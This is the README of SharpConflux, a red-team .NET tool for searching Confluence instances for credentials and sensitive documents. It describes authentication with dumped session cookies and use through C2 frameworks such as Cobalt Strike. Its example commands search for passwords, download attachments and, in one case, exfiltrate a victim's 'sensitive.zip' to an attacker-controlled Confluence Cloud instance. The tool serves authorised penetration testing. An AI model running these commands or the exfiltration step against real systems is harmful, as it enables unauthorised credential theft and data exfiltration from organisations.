# SharpConflux

SharpConflux is .NET application built to facilitate Confluence exploration. It allows Red Team operators to easily investigate Confluence instances with the goal of finding credential material and documentation relating to objectives without having to rely on SOCKS proxying.

## Features

* Support for Confluence Cloud and Confluence Server / Data Center (i.e. on-premise) instances. As of the initial release, it has been extensively tested against two Confluence Cloud instances running version 8.3.2, a Confluence Data Center instance running version 8.3.2, and a Confluence Data Center instance running version 7.19.10 LTS
* Multiple authentication methods supported to cover a variety of scenarios:
  * Confluence Cloud: Username + API token via `Authorization: Basic` header
  * Confluence Cloud: Cookie(s) (e.g. `cloud.session.token` or `tenant.session.token`)
  * Confluence Server / Data Center: Username + Password via HTTP POST request to `/dologin.action`
  * Confluence Server / Data Center: Username + Password via `Authorization: Basic` header
  * Confluence Server / Data Center: Personal Access Token (PAT) via `Authorization: Bearer` header
  * Confluence Server / Data Center: Cookie(s) (e.g. `JSESSIONID` or `seraph.confluence`)
* List available spaces
* Query Confluence for specific values, or run manual Confluence Query Language (CQL) queries to find files or pages of interest
* Display raw or prettified HTML source code of specific Confluence pages
* Download Confluence attachments to the local file system or print them as base64-encoded strings which can be converted offline for increased OPSEC
* Upload Confluence attachments to the specified page. This is particularly useful for data exfiltration to operator-controlled Confluence Cloud instances. Note that the maximum attachment size is set to 100 MB by default, so you may want to alter the "Attachment Maximum Size" setting on `/wiki/admin/editgeneralconfig.action#attachments` to allow for larger files to be exfiltrated
* Compatible with various C2 frameworks such as PoshC2 via `run-exe` (`run-exe SharpConflux.Program SharpConflux <Arguments>`), Cobalt Strike via `execute-assembly` and anthemtotheego's `inlineExecute-Assembly`, and Nighthawk via `inproc-execute-assembly`
  * When using the `/b64` option: Cobalt Strike's `execute-assembly` may not display the base64-encoded string in the UI (known bug in Cobalt Strike when printed strings are too large), but it will still be available in the logs. `inlineExecute-Assembly` may crash the implant if the downloaded attachment is sufficiently large. No problems have been observed in PoshC2 or Nighthawk
  * Please note that argument parsing in Cobalt Strike works differently than other C2s. As a result, you'll want to execute commands as `execute-assembly SharpConflux.exe "/url:http://confluenceinstance.internal.local:8090" /onprem "/query:password" ...` instead of `execute-assembly SharpConflux.exe /url:"http://confluenceinstance.internal.local:8090" /onprem /query:"password" ...`

## Important Considerations

Atlassian offers three Confluence hosting options to fit different organisation’s requirements:
* Confluence Cloud: Maintained by Atlassian and hosted on their AWS tenants. They are accessed as a subdomain of atlassian.net (e.g. https://companysubdomain.atlassian.net/wiki/).
* Confluence Server / Data Center: Maintained by the relevant organisation and therefore, hosted on organisation-managed servers. Whilst usually hosted on-premise (e.g. http://confluenceinstance.internal.local:8090/), it can also be hosted in any cloud tenant managed by the organisation (e.g. Azure, AWS, GCP). Confluence Data Center is similar to Confluence Server but includes additional features (https://confluence.atlassian.com/doc/confluence-server-and-data-center-feature-comparison-953652032.html). For the purpose of this tool, Confluence Server and Confluence Data Center are considered equivalent.

It should be noted that API endpoints and attributes differ slightly between Cloud and Server / Data Center instances. More importantly, authentication methods are significantly different. SharpConflux has been developed with compatibility in mind, supporting a variety of authentication methods across the different instance types.

## Authentication in Confluence

### Confluence Cloud - Email address + password authentication

Users can authenticate to Confluence Cloud instances using an email address and password combination. Upon browsing https://companysubdomain.atlassian.net/wiki/, unauthenticated users are redirected to https://id.atlassian.com/login, where the following HTTP POST request is sent:

```
POST /rest/authenticate?application=confluence&continue=https%3A%2F%2Fid.atlassian.com%2Fjoin%2Fuser-access%3Fresource%3Dari%253Acloud%253Aconfluence%253A%253Asite%252FGUIDVALUEOFSITE%26continue%3Dhttps%253A%252F%252Fcompanysubdomain.atlassian.net%252Fwiki%252F&email=EMAILVALUE HTTP/2.0
Host: id.atlassian.com
[...]
{"username":"EMAILVALUE","password":"PASSWORDVALUE","state":{"csrfToken":"CSRFTOKENVALUE","anonymousId":"ANONYMOUSIDVALUE"},"token":"TOKENVALUE"}
```

If the provided `username`, `password`, `csrfToken` and `token` parameters are valid, the Confluence Cloud instance will return a redirect URI. Subsequently visiting this URI will cause the server to set the `cloud.session.token` session cookie.

This authentication method is unsupported by SharpConflux. From an adversarial perspective, firms very rarely rely on this authentication mechanism, as most will be using SAML SSO authentication for Cloud instances.

### Confluence Cloud - Email address + API token

Users can create and manage their own API tokens by visiting https://id.atlassian.com/manage-profile/security/api-tokens. In order to authenticate, the user’s email address and API token are submitted through the `Authentication: Basic` header in each HTTP request.

This authentication method is supported by SharpConflux through the `/cloud /user:"VALUE" /apitoken:"VALUE"` arguments. However, gathering valid API tokens is a rare occurrence.

### Confluence Cloud - Third Party and SAML SSO

Confluence Cloud allows users to log in with third party (e.g. Apple, Google, Microsoft, Slack) accounts. Typically, firms will configure Confluence Cloud instances to authenticate through Active Directory Federation Services (ADFS) or Azure AD.

Once the SAML exchange is completed, the server will return a redirect URI to https://id.atlassian.com/login/authorize. Subsequently accessing this URI will cause the server to set the `cloud.session.token` session cookie.

This authentication method is unsupported by SharpConflux. Whilst this is the most commonly deployed authentication method by organisations relying on Confluence Cloud, it is also frequent for them to enforce Multi-Factor Authentication (MFA), making cookie-based authentication a much more interesting method from an adversarial perspective.

### Confluence Cloud - Cookied-based Authentication

If you have managed to dump Confluence Cloud cookies (e.g. via DPAPI), you can use SharpConflux to authenticate to the target instance by specifying the `/cloud /cookies:"COOKIENAME=COOKIEVALUE"` arguments. Please note that including a single valid `cloud.session.token` or `tenant.session.token` cookie should be sufficient to authenticate, but you can specify any number of cookies with `/cloud /cookies:"COOKIENAME1=COOKIEVALUE1;COOKIENAME2=COOKIEVALUE2;COOKIENAME3=COOKIEVALUE3"`.

### Confluence Server / Data Center - Username + password Basic authentication 

By default, Confluence Server / Data Center installations support username + password authentication through the `Authorization: Basic` HTTP request header. However, Basic authentication can be disabled by the target organisation through the "Allow basic authentication on API calls" setting.

This authentication method is supported by SharpConflux through the `/onprem /user:"VALUE" /pwd:"VALUE" /basic` arguments. From an adversarial perspective, finding a username and password combination for an on-premise Confluence instance is one of the most common scenarios.

### Confluence Server / Data Center - Username + password authentication via form data

Users can visit the on-premise Confluence website (e.g. http://confluenceinstance.internal.local:8090/) and log in using a valid username and password combination. The following HTTP POST request will be sent as a result:

```
POST /dologin.action HTTP/1.1
[...]
os_username=USERNAMEVALUE&os_password=PASSWORDVALUE&login=Log+in&os_destination=%2Findex.action
```
If the provided credentials within the `os_username` and `os_password` parameters are correct, the server will set the `JSESSIONID` session cookie.

This authentication method is supported by SharpConflux through the `/onprem /user:"VALUE" /pwd:"VALUE" /form` arguments. Similarly to the previous method, finding a username and password combination is one of the most common scenarios. Please note that this authentication method will still work even if the "Allow basic authentication on API calls" setting is disabled. 

### Confluence Server / Data Center - Personal Access Token (PAT)

On Confluence Server / Data Center installations, users are allowed to create and manage their own Personal Access Tokens (PATs), which will match their current permission level. PATs can be created from `/plugins/personalaccesstokens/usertokens.action` and can then be used by sending subsequent HTTP requests with the `Authorization: Bearer` header.

This authentication method is supported by SharpConflux through the `/onprem /pat:"VALUE"` arguments. From an adversarial perspective, it is uncommon to find users with PATs, so this authentication method has only been added for completeness and to support edge cases.

### Confluence Server / Data Center - SSO

Similarly to Confluence Cloud instances, Confluence Server / Data Center instances support authentication through various Identity Providers (IdP) including ADFS, Azure AD, Bitium, Okta, OneLogin and PingIdentity. However, in this case, it is uncommon to find on-premise Confluence instances making use of SSO. For this reason, this authentication method is currently unsupported by SharpConflux.

### Confluence Server / Data Center - Cookie-based authentication

If you have managed to dump Confluence Server / Data Center cookies (e.g. via DPAPI), you can use SharpConflux to authenticate to the target instance by specifying the `/onprem /cookies:"COOKIENAME=COOKIEVALUE"` arguments. Please note that including a single valid `JSESSIONID` or `seraph.confluence` cookie should be sufficient to authenticate, but you can include any number of cookies with `/onprem /cookies:"COOKIENAME1=COOKIEVALUE1;COOKIENAME2=COOKIEVALUE2;COOKIENAME3=COOKIEVALUE3"`.


## Usage

```
[*] Usage: SharpConflux.exe <Arguments>
[*] Core Arguments:
    /url      :  Confluence URL (e.g. https://my-confluence-instance.atlassian.net)
    /ua       :  User-Agent string to use. Default: "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
    /help     :  Show help message
[*] Confluence Type Arguments:
    /cloud    :  Confluence Cloud version hosted in https://clientsubdomain.atlassian.net
    /onprem   :  Confluence Server / Data Center version, typically hosted on-premise (e.g. http://confluenceinstance.internal.local:8090)
[*] Authentication Arguments:
    /user     :  Username / email adress to authenticate with
    /pwd      :  Password associated to the specified username. Only supported for Confluence Server / Data Center instances
    /basic    :  If toggled, username + password will use Basic authentication. Only supported for Confluence Server / Data Center instances
    /form     :  If toogled, username + password authentication will be performed through form data. Only supported for Confluence Server / Data Center instances
    /apitoken :  API token associated to the specified username. Only supported for Confluence Cloud instances
    /pat      :  Personal Access Token (PAT) for username-less authentication. Only supported for Confluence Server / Data Center instances
    /cookies  :  Session cookie(s) for username-less authentication. For Confluence Cloud, typically providing "tenant.session.token" or "cloud.session.token" is sufficient. For Confluence Server / Data Center, typically "JSESSIONID" or "seraph.confluence" is sufficient
[*] Action Arguments:
    /spaces   :  List available spaces
    /query    :  String to search for (e.g. password)
    /cql      :  Manual CQL query (e.g. "(type=page OR type=blogpost) AND (title ~ Password OR text ~ Password)" )
    /limit    :  Limit the number of results. Default: 10
    /view     :  View the source code of the specified page ID
    /pretty   :  If toggled, the returned HTML source code will have HTML tags removed for easier reading
    /download :  Download an attachment by its ID
    /b64      :  If toggled, the downloaded attachment will be displayed as a large base64-encoded string instead of being dropped to disk
    /upload   :  Upload an attachment to the specified page ID
    /path     :  File system path used when saving an attachment to disk (default: filename of the attachment in the current working directory) and when uploading an attachment
```

## Examples

* Authenticate to an on-premise Confluence instance using a Personal Access Token (PAT), then list the available spaces. The `User-Agent` applied to HTTP requests will match Chromium Edge 114 
```
> SharpConflux.exe "http://confluenceinstance.internal.local:8090" /onprem /spaces /pat:"MDY[...REDACTED...]nkEs" /ua:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51"
[+] Authentication method: Personal Access Token (PAT)
[+] Please note that this method is only supported for Confluence Server / Data Center instances
[+] Listing available spaces
[+] Spaces URI: /rest/api/space?limit=10
[>] Key: ds | Name: Demonstration Space | ID: 131073 | Type: global | Description:  | Link: http://confluenceinstance.internal.local:8090/rest/api/space/ds
[>] Key: SYL | Name: Sylvarant | ID: 131074 | Type: global | Description:  | Link: http://confluenceinstance.internal.local:8090/rest/api/space/SYL
```

* Authenticate to an on-premise Confluence instance using username+password (through the `Authorization: Basic` header), then search for pages, blogposts and attachments containing the word "password"
```
> SharpConflux.exe /url:"http://confluenceinstance.internal.local:8090" /onprem /query:"password" /limit:20 /user:jose /pwd:password /basic
[+] Authentication method: username + password
[+] Please note that this method is only supported for Confluence Server / Data Center instances
[+] Using Authorization: Basic header
[+] Searching for pages matching: password
[+] Search URI (pages): /rest/api/content/search?limit=20&expand=version&cql=(type=page%20OR%20type=blogpost)%20AND%20text%20~%20%22password%22
[>] Title: Passwords for super important system | Type: page | ID: 98318 | Version #1 by Kratos Aurion (kratos) @ 28/06/2023 10:58:24
[>] Title: Nothing to see here | Type: page | ID: 98381 | Version #3 by Lloyd Irving (lloyd) @ 28/06/2023 11:20:30
[>] Title: Server Connections | Type: page | ID: 98322 | Version #1 by Jose (jose) @ 28/06/2023 10:58:24
[+] Searching for attachments matching: password
[+] Search URI (attachments): /rest/api/content/search?limit=20&expand=version&cql=(type=attachment)%20AND%20text%20~%20%22password%22
[>] Title: passwords.xlsx | ID: 98382 | Size: 358 bytes | Version #1 by Genis (genis) @ 28/06/2023 11:20:19
```

* Authenticate to a Confluence Cloud instance using a dumped `tenant.session.token` cookie, then run a manual CQL query to look for attachments whose title contains the word "login"
```
> SharpConflux.exe /url:"https://my-confluence-instance.atlassian.net" /cloud /cql:"(type=attachment AND title ~ login)" /limit:3 /cookies:"tenant.session.token=eyJra[...REDACTED...]YAXA"
[+] Authentication method: cookie(s)
[+] Using cookie: tenant.session.token
[+] Executing CQL query: (type=attachment AND title ~ login)
[+] Search URI: /wiki/rest/api/content/search?limit=3&expand=version&cql=(type%3dattachment+AND+title+%7e+login)
[>] Title: mainframe-logins.txt | Type: attachment | ID: att96829872 | Version #1 by Matthew Smith (matthew.smith@example.com) @ 26/04/2023 10:59:51
[>] Title: logindetails.xlsx | Type: attachment | ID: att96829683 | Version #1 by James Jones (james.jones@example.com) @ 13/10/2021 11:14:49
[>] Title: objective-login-guide.pdf | Type: attachment | ID: att96829667 | Version #1 by Graham Murray (graham.murray@example.com) @ 28/01/2020 10:58:25
```

* Authenticate to a Confluence Cloud instance using a dumped `cloud.session.token` cookie, then display the raw source code of the page with ID 13371337
```
> SharpConflux.exe /url:"https://my-confluence-instance.atlassian.net" /cloud /view:"13371337" /cookies:"cloud.session.token=eyJra[...REDACTED...]kZAA"
[+] Authentication method: cookie(s)
[+] Using cookie: cloud.session.token
[+] Showing the source code of the page identified by: 13371337
[+] Page URI: /wiki/rest/api/content/13371337?expand=body.storage,history.lastUpdated
[>] Page Title: Test Page
[>] Creation Details: Jose (jose@example.com) @ 20/06/2023 21:24:17
[>] Last Update Details: Ben Evans (ben@example.com) @ 23/06/2023 12:59:42
[>] Raw Source Code:
<h1>Credentials for sensitive system: <strong>10.1.2.3</strong>.</h1><p>Credentials for 10.1.2.3:22: user:supersecurepassword</p>
[...REDACTED...]
```

* Authenticate to a Confluence Cloud instance using username + API token, then display the prettified source code of the page with ID 13371337
```
> SharpConflux.exe /url:"https://my-confluence-instance.atlassian.net" /cloud /view:"13371337" /pretty /user:"jose@example.com" /apitoken:"ATAT[...REDACTED...]DFFB"
[+] Authentication method: username + API token
[+] Please note that this method is only supported for Confluence Cloud instances
[+] Showing the source code of the page identified by: 13371337
[+] Page URI: /wiki/rest/api/content/13371337?expand=body.storage,history.lastUpdated
[>] Page Title: Test Page
[>] Creation Details: Jose (jose@example.com) @ 20/06/2023 21:24:17
[>] Last Update Details: Ben Evans (ben@example.com) @ 23/06/2023 12:59:42
[>] Raw Source Code:
Credentials for sensitive system: 10.1.2.3.Credentials for 10.1.2.3:22: user:supersecurepassword
[...REDACTED...]
```

* Authenticate to an on-premise Confluence instance using a dumped `JSESSIONID` cookie, then download the attachment with ID 98381 to the current working directory
```
> SharpConflux.exe /url:"http://confluenceinstance.internal.local:8090" /onprem /download:98381 /cookies:"JSESSIONID=A8A23[...REDACTED...]50C8F"
[+] Authentication method: cookie(s)
[+] Using cookie: JSESSIONID
[+] Downloading the attachment identified by: 98381
[+] Attachment URI: /rest/api/content/98381
[>] Title: file.txt | ID: 98381 | Size: 149 bytes | Version #1 by James (admin) @ 28/06/2023 20:12:38
[>] Download URI: /download/attachments/98380/file.txt?version=1&modificationDate=1687979558846&api=v2
[+] Downloading attachment (file.txt) to file.txt
[+] Download complete
```

* Authenticate to an on-premise Confluence instance using username+password (through the `Authorization: Basic` header), then download the attachment with ID 98381 to the `C:\Users\Public\file.txt` path
```
> SharpConflux.exe /url:"http://confluenceinstance.internal.local:8090" /onprem /download:98381 /path:"C:\Users\Public\file.txt" /user:jose /pwd:password /basic
[+] Authentication method: username + password
[+] Please note that this method is only supported for Confluence Server / Data Center instances
[+] Using Authorization: Basic header
[+] Downloading the attachment identified by: 98381
[+] Attachment URI: /rest/api/content/98381
[>] Title: file.txt | ID: 98381 | Size: 149 bytes | Version #1 by James (admin) @ 28/06/2023 20:12:38
[>] Download URI: /download/attachments/98380/file.txt?version=1&modificationDate=1687979558846&api=v2
[+] Downloading attachment (file.txt) to C:\Users\Public\file.txt
[+] Download complete
```

* Authenticate to an on-premise Confluence instance using username+password (by submitting a form to `dologin.action`), then download the attachment with ID 98381 and print it as a base64-encoded string
```
> SharpConflux.exe /url:"http://confluenceinstance.internal.local:8090" /onprem /download:98381 /user:jose /pwd:password /form /b64
[+] Authentication method: username + password
[+] Please note that this method is only supported for Confluence Server / Data Center instances
[+] Sending HTTP POST request with form data to /dologin.action
[+] Downloading the attachment identified by: 98381
[+] Attachment URI: /rest/api/content/98381
[>] Title: file.txt | ID: 98381 | Size: 149 bytes | Version #1 by James (admin) @ 28/06/2023 20:12:38
[>] Download URI: /download/attachments/98380/file.txt?version=1&modificationDate=1687979558846&api=v2
[+] Downloading attachment (file.txt) as a base64-encoded string
SnVuIDI[...REDACTED...]mVnDQo=
[+] Download complete
```

* Authenticate to an operator-controlled Confluence Cloud instance using username + API token, then exfiltrate the `C:\Users\victim\sensitive.zip` file as an attachment to the page with ID 13371337
```
> SharpConflux.exe /url:"https://attackerinstance.atlassian.net" /cloud /upload:13371337 /path:"C:\Users\victim\sensitive.zip" /user:"attacker@example.com" /apitoken:"ATAT[...REDACTED...]DFFB"
[+] Authentication method: username + API token
[+] Please note that this method is only supported for Confluence Cloud instances
[+] Uploading the "C:\Users\victim\sensitive.zip" file as an attachment of the page identified by: 13371337
[+] Attachment URI: https://attackerinstance.atlassian.net/wiki/rest/api/content/13371337/child/attachment
[+] Upload complete
```

## Compilation Instructions

SharpConflux has been built against .NET Framework 4.5. Simply open up the project solution in Visual Studio, choose "Release", and "Build".
It uses the Newtonsoft.Json library and Costura Fody to embed external DLLs into the EXE.

## TO-DO

* Add support for SSO authentication through Microsoft ADFS and Azure AD in Confluence Cloud instances
* Allow operators to view / download previous versions of the same page and attachment